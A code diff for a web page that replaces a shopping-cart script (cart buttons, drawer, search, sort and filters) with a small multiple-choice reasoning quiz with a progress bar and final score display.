+      { q: "Parent is to Child. Uncle is to...", a: ["Niece/Nephew", "Brother", "Parent"], correct: "Niece/Nephew" },
+      { q: "1 + 2 + 3 + 4 = ?", a: ["9", "10", "11"], correct: "10" },
+      { q: "Opposite of Fast is Slow. Opposite of High is...", a: ["Low", "Narrow", "Far"], correct: "Low" },
+      { q: "12 months is 1 year. 24 months is...", a: ["1 year", "2 years", "3 years"], correct: "2 years" },
+      { q: "Which is the largest number?", a: ["0.9", "0.09", "0.99"], correct: "0.99" },
+      { q: "Pen is to Write. Scissors is to...", a: ["Cut", "Glue", "Fold"], correct: "Cut" },
+      { q: "15 minutes is what fraction of an hour?", a: ["1/2", "1/3", "1/4"], correct: "1/4" },
+      { q: "1, 3, 5, 7, ... What's next?", a: ["8", "9", "11"], correct: "9" }
+    ];
 
-/* ------------------------------- */
-/* EVENTS */
-/* ------------------------------- */
+    let state = { index: 0, score: 0 };
 
-document.addEventListener('click',e=>{
-  const add=e.target.closest('[data-add]');
-  if(add){
-    const p=PRODUCTS.find(x=>x.id===add.dataset.add);
-    if(!state.cart[p.id]) state.cart[p.id]={...p,qty:0};
-    state.cart[p.id].qty++;
-    saveCart();renderCart();
-    drawer.classList.add('open');
-  }
+    function render() {
+      const q = QUESTIONS[state.index];
+      document.getElementById('progress').style.width = ((state.index + 1) / QUESTIONS.length * 100) + '%';
+      document.getElementById('qText').textContent = q.q;
+      document.getElementById('options').innerHTML = q.a.map(opt => `
+        <button onclick="check('${opt}')" class="p-4 border-2 border-gray-200 rounded-xl hover:border-green-500 hover:bg-green-50 text-left transition font-medium">
+          ${opt}
+        </button>
+      `).join('');
+    }
 
-  const inc=e.target.closest('[data-inc]');
-  if(inc){
-    state.cart[inc.dataset.inc].qty++;
-    saveCart();renderCart();
-  }
-
-  const dec=e.target.closest('[data-dec]');
-  if(dec){
-    const id=dec.dataset.dec;
-    state.cart[id].qty--;
-    if(state.cart[id].qty<=0) delete state.cart[id];
-    saveCart();renderCart();
-  }
-
-  const rem=e.target.closest('[data-rem]');
-  if(rem){
-    delete state.cart[rem.dataset.rem];
-    saveCart();renderCart();
-  }
-});
-
-/* DRAWER */
-const drawer=document.getElementById('drawer');
-document.getElementById('cartBtn').onclick=()=>drawer.classList.add('open');
-document.getElementById('closeDrawer').onclick=()=>drawer.classList.remove('open');
-
-/* FILTERS */
-document.getElementById('q').oninput=e=>{
-  state.q=e.target.value;renderProducts();
-};
-document.getElementById('sortSelect').onchange=e=>{
-  state.sort=e.target.value;renderProducts();
-};
-
-document.querySelectorAll('.filter-chip').forEach(ch=>{
-  ch.onclick=()=>{
-    document.querySelectorAll('.filter-chip').forEach(x=>x.classList.remove('active'));
-    ch.classList.add('active');
-    state.filter=ch.dataset.filter;
-    renderProducts();
-  };
-});
-
-/* INIT */
-renderProducts();
-renderCart();
-</script>
-
+    function check(answer) {
+      if (answer === QUESTIONS[state.index].correct) state.score++;
+      state.index++;
+      if (state.index < QUESTIONS.length) {
+        render();
+      } else {
+        document.getElementById('quizArea').classList.add('hidden');
+        document.getElementById('resultArea').classList.remove('hidden');
+        document.getElementById('scoreText').textContent = `Your Final Score: ${state.score} / ${QUESTIONS.length}`;
+      }
+    }
+    render();
+  </script>
 </body>
 </html>
